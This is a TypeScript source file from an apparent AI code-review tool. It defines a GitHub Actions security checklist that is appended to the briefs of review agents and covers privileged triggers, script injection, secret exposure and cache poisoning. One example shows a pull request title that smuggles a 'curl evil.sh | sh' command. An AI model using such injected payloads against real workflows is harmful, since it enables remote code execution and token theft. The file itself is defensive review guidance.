/**
 * @license
 * Copyright 2026 Qwen Team
 * SPDX-License-Identifier: Apache-2.0
 */

// Checklists that attach to a *path*, not to a dimension.
//
// The review's dimensions are domain-blind by design — "find security bugs" is a
// lens, not a syllabus — and that works until a file's failure modes are not
// guessable from reading it. A GitHub Actions workflow is the clearest case in this
// repository: it is a YAML file, so it reads as configuration, and a reviewer who
// treats it as configuration misses every one of its attack classes. Not one of the
// nine dimension agents knows to ask whether a `pull_request_target` job checks out
// the pull request's head, and the answer to that question is the difference between
// a CI file and a remote code execution with the repository's write token.
//
// This repo runs `qwen-autofix.yml`, which posts to pull requests. The skill already
// knows a PR branch's CI config is untrusted — Agent 7 is told to read it from the
// base branch — but nothing ever *reviewed a workflow change* for that attack class.
//
// So: a small table of path → checklist, appended to the brief of every agent whose
// territory actually contains a matching file. It is additive to the project's own
// rules (`.qwen/review-rules.md` and friends), never a replacement: a project that
// says nothing about workflows still gets these, and a project that says something
// gets both.
//
// Deliberately *not* here: style rules. The one open-source checklist this borrows
// its shape from ships opinions about `var`, `==`, and nested ternaries — which
// collide head-on with this skill's Exclusion Criteria against formatter-fixable
// nits, and would spend a reviewer's attention on the things a linter already owns.
// A path rule earns its place by naming a defect the dimensions cannot see.

export interface PathRule {
  /** Named in the brief, so an agent can say which rule it applied. */
  title: string;
  /** Does this rule govern `path`? */
  matches(path: string): boolean;
  /** The checklist, agent-facing. */
  checklist: string;
}

const GITHUB_ACTIONS: PathRule = {
  title: 'GitHub Actions workflows',
  matches: (p) =>
    /^\.github\/(workflows\/.+\.ya?ml|actions\/.+\/action\.ya?ml)$/i.test(p),
  checklist: `A workflow is not configuration. It is code that runs on the project's own runners, with the repository's credentials, and some of its inputs come from strangers. The classes below are invisible to a reader looking for "bugs" in YAML.

**You are reviewing this diff, not auditing this file.** A weakness the workflow already had, on a line this change does not touch, is out of scope — the same rule as everywhere else. What is in scope: a line this diff **adds or changes**, and a guard this diff **removes**.

**Blockers (Critical) — the code does something wrong:**

- **A privileged trigger that checks out the pull request's head.** \`pull_request_target\`, \`workflow_run\` and \`issue_comment\` run in the context of the *base* repository: the base branch's workflow, the base repository's secrets, and a token that can **write**. A checkout of \`github.event.pull_request.head.sha\` / \`.head.ref\` / \`refs/pull/N/merge\` then puts **the contributor's code** in the working directory, and the first \`run:\`, \`npm ci\` (which executes the PR's lifecycle scripts), or locally-referenced action executes it with all of that. This is the most exploited misconfiguration in GitHub Actions. A workflow that needs the PR's *content* without running it should use \`pull_request\` (no secrets, read token), or check out the base and read only the files it will parse.
- **Untrusted \`\${{ ... }}\` interpolated into a \`run:\` script.** The runner substitutes the expression into the shell script **before the shell parses it**, so the value is not a string — it is syntax. \`github.event.issue.title\`, \`.pull_request.title\`, \`.body\`, \`.comment.body\`, \`.head_ref\`, \`.head.repo.description\`, \`.head.repo.default_branch\`, every \`workflow_dispatch\` \`inputs.*\`, and every commit message and branch name are contributor-controlled. A pull request titled \`a"; curl evil.sh | sh; #\` is a command. The fix is to pass the value through \`env:\` and reference \`"$VAR"\` inside the script, where the shell treats it as data.
- **A secret placed where a step that runs untrusted code can read it.** A secret in \`env:\` at workflow or job level is in the environment of **every** step, including the one that builds the pull request. Scope it to the step that uses it. Same for \`persist-credentials\` on \`actions/checkout\`: at its default it writes the token into \`.git/config\`, where any later step — or a script the PR contributed — can read it.
- **A fork guard this diff removes or fails to add on a newly-privileged path.** For any trigger a fork can fire, the guard is what makes everything above unreachable: \`if: github.event.pull_request.head.repo.full_name == github.repository\`, an author-association check, or a \`github.repository == '<owner>/<repo>'\` gate on a scheduled job. A diff that adds a privileged trigger without one has added the vulnerability, not inherited it.
- **\`$GITHUB_OUTPUT\` / \`$GITHUB_ENV\` written from untrusted data.** \`echo "x=$UNTRUSTED" >> "$GITHUB_OUTPUT"\` with a value containing a newline injects a second, arbitrary variable — \`PATH\` or \`NODE_OPTIONS\` among them. Multi-line values need the heredoc form with an unguessable delimiter.
- **Artifact or cache poisoning across a trigger boundary.** A \`workflow_run\` job that downloads an artifact a \`pull_request\` job uploaded is pulling contributor-controlled bytes into a privileged context. So is a cache key a fork can populate.

**Recommendations (Suggestion) — say the cost, do not block on them:**

- **A third-party action on a mutable tag.** \`uses: someone/thing@v3\` follows a tag its owner can repoint, and it then runs with your token. Pinning to the 40-character SHA removes that. Judge the *change*: an action that **was** pinned and is now on a tag is a regression and belongs above; a new step that follows the project's existing convention does not. Actions published by GitHub itself (\`actions/*\`) and by this repository's own organisation are the common exception, and most projects take it — do not report those unless the project's own rules say otherwise.
- **\`permissions:\` absent or wider than the job needs.** With no block, the job inherits the repository default, which may be write-all. Naming the minimum at job level is the improvement. **Only report this for a job this diff adds or whose permissions it changes** — plenty of healthy projects have never set it, and sweeping their existing jobs into a PR review is exactly the noise that teaches an author to stop reading. **One exception, and it is not a Suggestion:** a broad token on a job that also runs untrusted code is not a separate recommendation, it is *the blast radius of the blocker above*. Say so there, as part of that finding, at Critical.

**The scripts the workflow calls are part of the workflow.** \`node .github/scripts/x.mjs --title "\${{ github.event.pull_request.title }}"\` moves the injection one file along; it does not remove it. If the diff changes such a script, review its argument handling and its own writes to \`$GITHUB_OUTPUT\` with the same eyes.

**Favour precision over recall here.** A false alarm on a workflow costs more reviewer trust than a missed minor nit, because a YAML finding is the easiest kind for an author to dismiss. Every finding needs the concrete trigger and the concrete outcome, like any other.`,
};

/** Every rule, in the order their checklists are appended. */
export const PATH_RULES: PathRule[] = [GITHUB_ACTIONS];

/**
 * The checklists that govern `paths`, as a brief section — or `''` when none do.
 *
 * Scoped to what the agent can actually see. An agent whose territory holds no
 * workflow is not handed the workflow checklist: a rule that fires on every review
 * is a rule that gets skimmed, and this one has to be read.
 */
export function pathRulesFor(paths: readonly string[]): string {
  const hit = PATH_RULES.filter((r) => paths.some((p) => r.matches(p)));
  if (hit.length === 0) return '';
  const parts = ['## Rules for the files in front of you', ''];
  for (const r of hit) {
    const which = paths.filter((p) => r.matches(p));
    parts.push(`### ${r.title} — ${which.join(', ')}`, '', r.checklist, '');
  }
  return parts.join('\n').trimEnd();
}
